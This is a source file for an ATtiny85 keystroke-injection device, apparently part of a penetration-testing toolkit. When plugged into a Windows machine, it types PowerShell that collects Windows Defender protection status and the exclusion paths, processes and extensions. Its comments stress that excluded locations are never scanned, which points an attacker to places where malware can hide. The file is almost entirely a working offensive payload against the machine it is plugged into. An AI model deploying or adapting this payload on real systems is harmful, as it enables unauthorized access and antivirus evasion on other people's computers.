// recon/defender-status - Tier 2
//
// Real-time protection state and exclusion lists.
//
// Exclusion lists are the single most useful defender finding in most
// engagements - anything listed there will never be scanned.
// Some Get-MpPreference fields need elevation; -EA 0 keeps it going either way.
//
// Read-only, no persistence, nothing left behind except the text file named in
// R_OUT. Output lands in C:\Users\Public\ds-recon\ on the target.

#include <duck.h>

// PROGMEM: this string must live in flash, not SRAM. The ATtiny85 has 512
// bytes of RAM and this script is far larger than that.
static const char S[] PROGMEM =
    R_MKDIR
    "$mp=Get-MpComputerStatus -EA 0"
    "$mp|Select AMProductVersion,AMServiceEnabled,AntivirusEnabled,AntispywareEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,TamperProtectionSource,QuickScanAge,FullScanAge|Format-List"
    "'=== EXCLUSION PATHS ==='"
    "(Get-MpPreference -EA 0).ExclusionPath"
    "'=== EXCLUSION PROCESSES ==='"
    "(Get-MpPreference -EA 0).ExclusionProcess"
    "'=== EXCLUSION EXTENSIONS ==='"
    "(Get-MpPreference -EA 0).ExclusionExtension"
    R_OUT("defender-status.txt")
    R_SHOW("defender-status.txt");

void setup() {
  duckBegin();
  ledPulse(2, 120, 120);
  recon(S);
  ledPulse(4, 150, 150);
}

void loop() {}
